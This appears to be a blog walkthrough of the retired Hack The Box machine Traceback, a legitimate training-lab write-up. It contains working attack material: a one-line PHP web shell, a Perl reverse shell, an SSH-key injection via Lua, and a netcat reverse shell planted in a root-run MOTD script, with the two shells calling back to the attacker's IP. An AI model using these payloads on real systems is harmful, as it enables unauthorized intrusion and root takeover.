---
layout: post
title: "Traceback: Hack The Box Walkthrough"
date: 2020-08-16 10:48:34 +0000
last_modified_at: 2020-08-16 10:48:34 +0000
category: Walkthrough
tags: ["Hack The Box", Traceback, retired, Linux, Easy]
comments: true
image:
  feature: traceback-htb-walkthrough.png
---

This post documents the complete walkthrough of Traceback, a retired vulnerable [VM][1] created by [Xh4H][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Traceback is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.181 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-03-16 12:52:36 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.181
Discovered open port 22/tcp on 10.10.10.181
```

Nothing unusual. Let's do one better with `nmap` scanning the discoverd ports to establish their services.

```
# nmap -n -v -Pn -p22,80 -A --reason 10.10.10.181 -oN nmap.txt
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
```

What a shit show. There's nothing! Well, here's what the site looks like.

{% include image.html image_alt="6be51932.png" image_src="/c3785ff4-2b69-4e45-b317-9c3e50e24c35/6be51932.png" %}

And check out the HTML source.

{% include image.html image_alt="f9caf3d2.png" image_src="/c3785ff4-2b69-4e45-b317-9c3e50e24c35/f9caf3d2.png" %}

### Some of the best web shells that you might need

Following the hint about some of the best web shells, I land up on this GitHub [repo](https://github.com/TheBinitGhimire/Web-Shells).

{% include image.html image_alt="769260e3.png" image_src="/c3785ff4-2b69-4e45-b317-9c3e50e24c35/769260e3.png" %}

I created a wordlist of files from the repo like so.

```
# curl -s https://github.com/TheBinitGhimire/Web-Shells | html2text | grep -P '\b.*php\b' | awk '{ print $1 }' | sort | uniq > shells.txt
```

And then fuzz the site with the `wfuzz` and the wordlist.

```
# wfuzz -w shells.txt --hc 404 http://10.10.10.181/FUZZ
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.181/FUZZ
Total requests: 15

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000014:   200        58 L     100 W    1261 Ch     "smevk.php"

Total time: 0.667009
Processed Requests: 15
Filtered Requests: 14
Requests/sec.: 22.48844
```

### SmEvK v3

There's a web shell at http://10.10.10.181/smevk.php alright.

{% include image.html image_alt="b2242bc1.png" image_src="/c3785ff4-2b69-4e45-b317-9c3e50e24c35/b2242bc1.png" %}

The credential (`admin:admin`) lets me in!

{% include image.html image_alt="40777fc6.png" image_src="/c3785ff4-2b69-4e45-b317-9c3e50e24c35/40777fc6.png" %}

Well, I prefer my own shell so I used the code injector page to write my own shell to `/var/www/html` like so.

```
<?php echo shell_exec($_GET[0]); ?>
```

{% include image.html image_alt="8a052171.png" image_src="/c3785ff4-2b69-4e45-b317-9c3e50e24c35/8a052171.png" %}

As usual, let's run a Perl reverse shell back to us.

```
perl -e 'use Socket;$i="10.10.16.125";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

{% include image.html image_alt="17073a87.png" image_src="/c3785ff4-2b69-4e45-b317-9c3e50e24c35/17073a87.png" %}

Follow this excellent [guide](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) to upgrade the shell to full interactive TTY with auto-completion. :wink:

### Getting `user.txt`

Since the file `user.txt` is not found in `webadmin`'s home directory, let's check out `/etc/passwd`.

{% include image.html image_alt="a4e27885.png" image_src="/c3785ff4-2b69-4e45-b317-9c3e50e24c35/a4e27885.png" %}

It should be `sysadmin`'s home directory then! During enumeration of `webadmin`'s account, I notice that `webadmin` is able to run `luvit` as `sysadmin` without password.

{% include image.html image_alt="5af80749.png" image_src="/c3785ff4-2b69-4e45-b317-9c3e50e24c35/5af80749.png" %}

Also, there's a note that says the following.

<div class="filename"><span>note.txt</span></div>

```
- sysadmin -
I have left this tool to practice Lua. Contact me if you have any question.
```

The creator has also kindly left an sample Lua file.

<div class="filename"><span>privesc.lua</span></div>

```lua
local test = io.open("/home/sysadmin/.ssh/authorized_keys", "a")
test:write("ssh-rsa AAAAB3N...eJTsVsKE= root@parrot\n")
test:close()
```

We just have to use it to write our own public key to `sysadmin`'s `authorized_keys`. Because I like `bash` better, I run the following command instead.

```
# ssh -i sysadmin sysadmin@10.10.10.181 -tt /bin/bash
```

{% include image.html image_alt="af3a1566.png" image_src="/c3785ff4-2b69-4e45-b317-9c3e50e24c35/af3a1566.png" %}

The file `user.txt` is indeed in `sysadmin`'s home directory.

{% include image.html image_alt="ae831fa0.png" image_src="/c3785ff4-2b69-4e45-b317-9c3e50e24c35/ae831fa0.png" %}

## Privilege Escalation

During enumeration of `sysadmin`'s account, I notice that `sysadmin` has group write permissions to message-of-the-day (MOTD) scripts in `/etc/update-motd.d`. In addition, there's a restoration of the scripts every minute.

{% include image.html image_alt="7d057b23.png" image_src="/c3785ff4-2b69-4e45-b317-9c3e50e24c35/7d057b23.png" %}

### Getting `root.txt`

Getting a `root` shell within a minute is pretty easy.

First, open a terminal and set up a `nc` listener.

Second, `echo` the following to `/etc/update-motd.d/00-header` in `sysadmin`'s shell:

```
$ echo -ne '#!/bin/sh\n\nrm -rf /tmp/p; mknod /tmp/p p; /bin/bash </tmp/p | /bin/nc 10.10.16.125 1234 >/tmp/p' > /etc/update-motd.d/00-header
```

Finally, open another terminal and login to `sysadmin`'s account via SSH.

{% include image.html image_alt="ce8dd8bc.png" image_src="/c3785ff4-2b69-4e45-b317-9c3e50e24c35/ce8dd8bc.png" %}

There you have it. Getting `root.txt` is trivial with a `root` shell.

{% include image.html image_alt="e8afcb13.png" image_src="/c3785ff4-2b69-4e45-b317-9c3e50e24c35/e8afcb13.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/233
[2]: https://www.hackthebox.eu/home/users/profile/21439
[3]: https://www.hackthebox.eu/
